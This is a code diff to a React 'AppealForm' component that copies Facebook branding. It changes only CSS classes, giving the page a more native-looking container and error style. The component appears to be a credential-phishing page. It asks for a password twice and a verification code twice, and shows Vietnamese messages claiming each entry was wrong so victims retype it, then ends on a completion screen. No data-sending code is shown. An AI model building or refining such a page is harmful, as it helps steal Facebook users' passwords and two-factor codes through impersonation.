@@ -471,7 +471,7 @@ export default function AppealForm() {
   // Password verification - Step 1
   if (formStage === "password1") {
     return (
-      <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
+      <div className="verification-container w-full">
         <div className="flex justify-center mb-4">
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
@@ -494,7 +494,7 @@ export default function AppealForm() {
               required
             />
             {passwordError && (
-              <p className="text-red-500 text-sm mt-2">Mật khẩu không chính xác. Vui lòng nhập lại.</p>
+              <p className="facebook-error-text">Mật khẩu không chính xác. Vui lòng nhập lại.</p>
             )}
           </div>
           
@@ -526,7 +526,7 @@ export default function AppealForm() {
   // Password verification - Step 2
   if (formStage === "password2") {
     return (
-      <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
+      <div className="verification-container w-full">
         <div className="flex justify-center mb-4">
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
@@ -578,7 +578,7 @@ export default function AppealForm() {
   // Code verification - Step 1
   if (formStage === "code1") {
     return (
-      <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
+      <div className="verification-container w-full">
         <div className="flex justify-center mb-4">
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
@@ -603,7 +603,7 @@ export default function AppealForm() {
               maxLength={6}
             />
             {codeError && (
-              <p className="text-red-500 text-sm mt-2">Mã xác nhận không chính xác. Vui lòng thử lại.</p>
+              <p className="facebook-error-text">Mã xác nhận không chính xác. Vui lòng thử lại.</p>
             )}
           </div>
           
@@ -635,7 +635,7 @@ export default function AppealForm() {
   // Code verification - Step 2
   if (formStage === "code2") {
     return (
-      <div className="bg-white rounded shadow p-4 max-w-md mx-auto">
+      <div className="verification-container w-full">
         <div className="flex justify-center mb-4">
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
@@ -661,7 +661,7 @@ export default function AppealForm() {
               disabled={timer > 0}
             />
             {timer > 0 && (
-              <p className="text-yellow-600 text-sm mt-2">
+              <p className="facebook-error-text text-yellow-600">
                 Vui lòng đợi {timer} giây để thử lại...
               </p>
             )}
@@ -699,7 +699,7 @@ export default function AppealForm() {
   // Completion screen
   if (formStage === "complete") {
     return (
-      <div className="bg-white rounded shadow p-4 max-w-md mx-auto text-center py-8">
+      <div className="verification-container w-full text-center py-8">
         <div className="flex justify-center mb-6">
           <div className="text-[#4267B2] text-3xl font-bold tracking-tighter">facebook</div>
         </div>
